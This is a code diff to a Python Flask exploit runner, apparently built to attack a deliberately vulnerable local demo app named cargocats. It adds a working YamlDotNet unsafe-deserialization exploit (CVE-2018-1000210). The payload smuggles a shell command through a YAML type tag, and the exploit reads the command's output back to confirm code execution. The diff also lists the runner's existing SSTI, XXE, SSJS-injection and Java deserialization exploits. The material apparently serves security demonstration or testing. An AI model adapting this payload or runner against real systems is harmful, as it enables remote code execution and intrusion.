@@ -8,6 +8,7 @@ import threading
 import datetime
 import os
 import zipfile
+import uuid
 import io
 import json
 import base64
@@ -746,6 +747,35 @@ def exploit_ssti():
     finally:
         exploit_running = False
 
+@app.route('/exploit/yaml-deserialization')
+def exploit_yaml_deserialization():
+    global exploit_running, exploit_state, exploit_output_buffer, stop_exploit_flag
+
+    if exploit_running:
+        return jsonify({"status": "error", "message": "Exploit already running"}), 400
+
+    exploit_running = True
+    exploit_state = "yaml_deserialization_exploit"
+
+    try:
+        session = requests.Session()
+        # Login first
+        login_result = run_login_exploit(session)
+        if not login_result:
+            log_exploit_output("Login failed - cannot proceed with YAML deserialization exploit", "ERROR")
+            return jsonify({"status": "error", "message": "Login failed - cannot proceed with YAML deserialization exploit"}), 500
+
+        result = run_yaml_deserialization_exploit(session)
+        exploit_state = "finished"
+        log_exploit_output(f"YAML deserialization exploit completed - Success: {result}")
+        return jsonify({"status": "success", "message": "YAML deserialization exploit completed", "result": result}), 200
+    except Exception as e:
+        exploit_state = "error"
+        log_exploit_output(f"YAML deserialization exploit failed: {str(e)}", "ERROR")
+        return jsonify({"status": "error", "message": f"YAML deserialization exploit failed: {str(e)}"}), 500
+    finally:
+        exploit_running = False
+
 @app.route('/exploit/list')
 def exploit_list():
     """List all available individual exploits"""
@@ -760,7 +790,8 @@ def exploit_list():
         {"name": "SSJS Injection", "endpoint": "/exploit/ssjs-injection", "description": "Server-side JavaScript injection"},
         {"name": "XXE", "endpoint": "/exploit/xxe", "description": "XML External Entity injection"},
         {"name": "Insecure Deserialization", "endpoint": "/exploit/deserialization", "description": "Java Insecure Deserialization exploit using address import functionality"},
-        {"name": "SSTI", "endpoint": "/exploit/ssti", "description": "FreeMarker Server-Side Template Injection (CVE-2025-64087)"}
+        {"name": "SSTI", "endpoint": "/exploit/ssti", "description": "FreeMarker Server-Side Template Injection (CVE-2025-64087)"},
+        {"name": "YAML Deserialization", "endpoint": "/exploit/yaml-deserialization", "description": "YamlDotNet unsafe deserialization RCE via photo tags import (CVE-2018-1000210)"}
     ]
     
     return jsonify({
@@ -1694,6 +1725,39 @@ def run_deserialization_exploit(session):
         log_exploit_output(f"Error during deserialization exploit: {str(e)}", "ERROR")
         return False
 
+def run_yaml_deserialization_exploit(session):
+    """Execute YamlDotNet unsafe deserialization RCE via photo tags import (CVE-2018-1000210)"""
+    log_exploit_output("Executing YamlDotNet deserialization exploit via photo tags import (CVE-2018-1000210)")
+    tags_url = "http://cargocats.localhost/api/photos/tags"
+    headers = {"Content-Type": "text/plain"}
+
+    try:
+        # Normal usage: an ordinary tags import runs the vulnerable YamlDotNet method with no attack
+        r = session.post(tags_url, data="cat: whiskers\ncolor: orange\n", headers=headers, timeout=10, allow_redirects=False)
+        log_exploit_output(f"Normal tags import response: {r.status_code} {r.text[:200] if r.text else 'Empty'}")
+
+        # YamlDotNet < 5.0.0 instantiates the type named in the tag. ThumbnailHook's Command setter runs a
+        # shell command, which writes `id` to a new file in the uploads folder that the photo viewer can read.
+        proof_file = f"yaml-rce-{uuid.uuid4().hex[:8]}.txt"
+        payload = f"!<!ThumbnailHook,imageservice>\nCommand: id > /app/uploads/{proof_file}\n"
+        r = session.post(tags_url, data=payload, headers=headers, timeout=10, allow_redirects=False)
+        log_exploit_output(f"YAML deserialization exploit response status: {r.status_code}")
+        log_exploit_output(f"YAML deserialization exploit response body: {r.text[:500] if r.text else 'Empty'}")
+
+        r_read = session.get(f"http://cargocats.localhost/api/photos/view?path={proof_file}", timeout=5, allow_redirects=False)
+        output = r_read.content.decode("utf-8", "replace").strip() if r_read.status_code == 200 else ""
+        if "uid=" in output:
+            log_exploit_output(f"SUCCESS: YAML deserialization exploit executed a command (output of id: {output})")
+            return True
+        if r.status_code == 500:
+            log_exploit_output(f"BLOCKED: the payload failed with 500 and the command did not run ({proof_file} was not created)")
+        else:
+            log_exploit_output(f"WARNING: payload returned {r.status_code} but no command output was found in {proof_file}")
+        return False
+    except Exception as e:
+        log_exploit_output(f"Error during YAML deserialization exploit: {str(e)}", "ERROR")
+        return False
+
 def run_ssti_exploit(session):
     """Execute FreeMarker SSTI exploit via report template generation (CVE-2025-64087)"""
     log_exploit_output("Executing FreeMarker SSTI exploit via report template generation")
@@ -1861,6 +1925,14 @@ def exploit():
         if check_exploit_stop("SSTI"):
             return
         run_ssti_exploit(session)
+
+        # ================================================
+        # YAML DESERIALIZATION EXPLOIT (CVE-2018-1000210)
+        # ================================================
+        exploit_state = "yaml_deserialization_exploit"
+        if check_exploit_stop("YAML Deserialization"):
+            return
+        run_yaml_deserialization_exploit(session)
 
         exploit_state = "finished"
         log_exploit_output("Exploit execution completed successfully")
